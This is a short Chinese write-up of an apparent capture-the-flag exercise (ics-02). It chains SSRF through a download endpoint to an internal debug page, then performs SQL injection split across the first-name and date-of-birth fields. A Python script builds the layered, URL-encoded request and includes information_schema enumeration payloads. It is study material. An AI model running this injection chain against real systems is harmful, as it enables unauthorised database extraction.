ailx10说：这篇是我2025年1月写的。ics-02 的下载接口把我带到了 SSRF，但内部页面还有自己的参数和 SQL 条件。我先用回环地址碰到 secret\_debuginternal，再围着 first\_name 和 DOB 两个字段，把查询片段拆开放进去，最后还要一层层做 URL 编码。这篇把外面的请求、里面的请求和数据库查询分着写，免得长载荷看着像一团乱码。它是一次很典型的多层输入练习：同一段内容到下一层时，字符可能已经变了，先确认每层究竟收到什么，后面的结果才解释得通。

---

本文记录通过服务端请求访问内部接口，再观察多个参数参与 SQL 拼接的历史过程。

原文未给完整 SQL；编码层数取决于具体链路。Python quote 默认保留斜杠，和 urlencode 的行为不可混为一谈。

但是天塌了，这哪个脑回路能想到SQL注入啊？

```
import random

from urllib.parse import urlencode,quote



url = "http://127.0.0.1/secret/secret_debug.php?"



# payload = "database()" # ssrfw

# payload = "select group_concat(table_name) from information_schema.tables where table_schema='ssrfw'" # cetcYssrf,users

# payload = "select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'" # secretName,value

payload = "select value from cetcYssrf LIMIT 1"



randstr = random.getrandbits(16)



params = {

            "s": "3",

            "txtfirst_name": "A','B',(" + payload + "),'D'/*",

            "txtmiddle_name": "B",

            "txtname_suffix": "C",

            "txtLast_name": "D",

            'txtdob': "*/,'E",

            'txtdl_nmbr': str(randstr),

            'txtRetypeDL': str(randstr),

            'btnContinue2': "Continue"

        }



encoded_query_string = urlencode(params)

# 对整个 URL 进行编码，包括查询字符串的 & 符号

encoded_url = url + quote(encoded_query_string)

print(encoded_url)

```

这类组合题最容易在编码上迷路。把外层下载请求、内层接口参数和最终查询分别保存，哪个符号属于哪一层就不会混，调试也能一次只改一处。
